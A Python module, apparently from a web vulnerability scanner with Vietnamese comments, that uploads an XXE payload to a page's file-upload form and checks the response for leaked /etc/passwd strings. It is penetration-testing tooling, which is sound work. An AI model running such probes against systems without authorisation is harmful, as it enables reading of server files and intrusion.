import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import os

XXE_PAYLOAD_FILE = "payloads/xxe.txt"

# Một số dấu hiệu khi thành công
XXE_SIGNS = [
    "root:x:", "root::0:0:", "<user>", "<data>", "<config>"
]

def trich_form(url):
    """
    Phân tích form HTML tại URL, lấy action, method, input fields
    """
    try:
        res = requests.get(url, timeout=7)
        soup = BeautifulSoup(res.text, "html.parser")
        forms = []
        for form in soup.find_all("form"):
            details = {}
            action = form.attrs.get("action")
            method = form.attrs.get("method", "get").lower()
            inputs = []
            for input_tag in form.find_all("input"):
                input_type = input_tag.attrs.get("type", "text")
                input_name = input_tag.attrs.get("name")
                inputs.append({"type": input_type, "name": input_name})
            details["action"] = urljoin(url, action) if action else url
            details["method"] = method
            details["inputs"] = inputs
            forms.append(details)
        return forms
    except Exception:
        return []

def scan_xxe(target_url, output):
    output.write("======= XXE =======\n")
    output.write(f"[*] Đang kiểm tra XXE trên: {target_url}\n")

    try:
        # Đọc payload từ file xxe.txt
        with open("payloads/xxe.txt", "r", encoding="utf-8") as f:
            payload = f.read()

        # Tạo file tạm chứa payload
        temp_file = "temp_xxe.xml"
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(payload)

        # Bước 1: GET trang để phân tích form
        res = requests.get(target_url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")

        form = soup.find("form")
        if not form:
            output.write("[!] Không tìm thấy form upload trên trang.\n")
            os.remove(temp_file)
            return

        # Lấy action và method
        action = form.get("action") or target_url
        if not action.startswith("http"):
            # Xử lý action tương đối
            from urllib.parse import urljoin
            action = urljoin(target_url, action)

        method = (form.get("method") or "post").lower()

        # Lấy tất cả input fields
        inputs = form.find_all("input")

        data = {}
        file_field = None

        for inp in inputs:
            name = inp.get("name")
            inp_type = (inp.get("type") or "text").lower()

            if inp_type == "file":
                file_field = name
            elif name:
                data[name] = inp.get("value", "")

        if not file_field:
            output.write("[!] Form không có trường file upload.\n")
            os.remove(temp_file)
            return

        # Chuẩn bị payload upload
        files = {
            file_field: ("xxe.xml", open(temp_file, "rb"), "text/xml")
        }

        # Bước 2: gửi request upload
        if method == "post":
            upload_res = requests.post(action, data=data, files=files, timeout=10)
        else:
            upload_res = requests.get(action, params=data, files=files, timeout=10)

        # Xoá file tạm
        os.remove(temp_file)

        # Bước 3: kiểm tra phản hồi
        if any(keyword in upload_res.text for keyword in ["root:x:", "/bin/bash", "daemon:x:"]):
            output.write("[!] Có thể bị tấn công XXE.\n")
        else:
            output.write("[✓] Không phát hiện lỗ hổng XXE.\n")

    except Exception as e:
        output.write(f"[!] Lỗi khi quét XXE: {e}\n")

